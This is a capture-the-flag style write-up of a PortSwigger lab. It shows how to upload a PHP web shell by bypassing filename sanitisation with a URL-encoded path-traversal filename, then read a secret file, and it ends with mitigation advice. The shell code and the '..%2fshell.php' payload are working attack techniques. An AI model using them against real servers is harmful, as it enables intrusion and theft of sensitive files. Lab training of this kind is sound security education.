# Web shell upload via path traversal

**Source:** [PortSwigger](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)  
**Category:** File Upload  
**Difficulty:** Practitioner

## Objective
To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

## Vulnerability
This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a [secondary vulnerability](https://portswigger.net/web-security/file-path-traversal).

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

### Steps

1. Access the lab and log in to your account, go to the user profile (**My account**) and find the avatar upload function.

2. Upload a `shell.php` file with PHP code that reads the contents of `/home/carlos/secret`:
    ```php
    <?php echo file_get_contents('/home/carlos/secret'); ?>
    ```
    The application confirms the file was saved:
    ```text
    "The file avatars/shell.php has been uploaded."
    ```
    Opening the file in the browser:
    ```text
    https://0a1d0005043c18ea826e474000cb0051.web-security-academy.net/files/avatars/shell.php
    ```
    returns **PHP source code instead of the execution result**:
    ```text
    <?php echo file_get_contents('/home/carlos/secret'); ?>
    ```
    Conclusion: the `/files/avatars/` directory has PHP execution disabled - files are treated as static. We need to use **path traversal** to save the file in a directory that executes PHP.

3. Try a simple path traversal in `filename`:
    ```text
    Content-Disposition: form-data; name="avatar"; filename="../shell.php"
    ```
    The application responds:
    ```text
    "The file avatars/shell.php has been uploaded."
    ```
    The message **does not contain `../`** - the application normalizes `filename` (most likely via `basename()`), removing the path traversal.

4. Try with `name` instead of `filename`:
    ```text
    Content-Disposition: form-data; name="avatar/../shell.php"; filename="shell.php"
    ```
    The application returns `403 Forbidden` - the `name` field must equal `avatar` for the form to parse.

5. Bypass the sanitization with a **URL-encoded separator** in `filename`:
    ```text
    Content-Disposition: form-data; name="avatar"; filename="..%2fshell.php"
    ```
    The application responds:
    ```text
    "The file avatars/../shell.php has been uploaded."
    ```
    The message **contains `../`** - the path traversal worked.

    Mechanics:
    - `basename("..%2fshell.php")` -> `..%2fshell.php` (because `%2f` is not `/`, so the function does not strip it)
    - The application **URL-decodes** -> `../shell.php`
    - The file is saved to `/files/avatars/../shell.php` = `/files/shell.php`
    - The `/files/` directory **executes PHP** - unlike `/files/avatars/`

6. Open the uploaded file URL in the browser so the server executes it:
    ```text
    https://0a1d0005043c18ea826e474000cb0051.web-security-academy.net/files/shell.php
    ```
    The server executes the PHP code - `file_get_contents` reads the contents of `/home/carlos/secret`, and `echo` outputs it in the HTTP response:
    ```text
    WXcHmTUlzd4I92jYQvEDBMRGLQHYnCYe
    ```

7. Copy the secret and submit it via the **Submit solution** button in the lab banner. Lab solved.

### Payload
```text
Content-Disposition: form-data; name="avatar"; filename="..%2fshell.php"
```

### Shortcut
1. Log in and go to **My account** -> avatar upload.
2. Intercept the upload request in Burp.
3. Set `filename="..%2fshell.php"` and keep the PHP payload as the file content.
4. Forward the request, then open `/files/shell.php`.
5. Copy the returned secret and submit it via **Submit solution**.

## Impact
An attacker can bypass filename sanitization using a URL-encoded path separator to write a file outside the intended upload directory. By placing a PHP file in a directory that executes PHP, the attacker achieves remote code execution, allowing sensitive file reads, secret exfiltration, and potentially full server compromise.

## Mitigation
Sanitize filenames by decoding input first, then applying strict validation and normalization. Use an allowlist of permitted filenames and extensions. Do not rely on `basename()` alone. Store uploads outside the web root or in a directory with script execution disabled. Serve uploaded files with a safe `Content-Type` and from a separate domain.

## Tools
- Burp Suite
- Repeater
- VSC

## Notes
- `/files/avatars/` does not execute PHP; `/files/` does.
- `basename()` does not strip `%2f`, so `..%2fshell.php` bypasses it.
- The application URL-decodes the filename after sanitization, restoring `../`.
- The file is written to `/files/shell.php` via path traversal.
- Opening `/files/shell.php` executes the payload and leaks the secret.